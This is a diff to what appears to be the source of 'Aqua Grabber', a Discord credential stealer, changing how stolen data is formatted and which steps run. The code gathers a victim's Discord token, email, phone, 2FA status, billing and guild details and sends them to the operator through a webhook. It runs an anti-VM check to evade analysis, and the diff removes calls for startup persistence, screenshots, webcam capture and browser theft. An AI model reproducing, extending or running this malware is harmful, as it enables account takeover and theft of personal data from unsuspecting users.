@@ -220,11 +220,12 @@ def getDcToken():
         webhook.content = f'```{user} | {username} | HWID: {get_HWID()}```'
         webhook.add_embed(embed)
         embed.set_title(
-            f"<a:Lightblue_Verification:1018036944946602025>  Discord Info  <a:Lightblue_Verification:1018036944946602025>\n\nUsername : `{username}`")
+            f"<a:Lightblue_Verification:1018036944946602025> Username : `{username}` <a:Lightblue_Verification:1018036944946602025>")
         embed.set_image(avatar)
         embed.set_description(
-            f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Aqua-Grabber)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
+            f"\n<a:right_arrow:988374691720888340> Token : ```{token}```\n✉️ Email: 📱 Phone :\n`{str(email)}`  `{phone}`")
         embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & Aqualt | Grabbed By Aqua 💦")
+        print(f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Aqua-Grabber)\n\n<a:right_arrow:988374691720888340> Token :\n `{token}`  <a:boost:988374649253552158> Nitro : `{nitro}`✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
 
         webhook.execute()
         webhook.remove_files()
@@ -662,12 +663,9 @@ webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252
 
 def runAqua():
     AntiVm()
-    copy_to_startup()
     makeDir()
-    takeSS()
-    getCam()
     getDcToken()
-    getBrowsers()
+    cleanUp()
 
 
 runAqua()
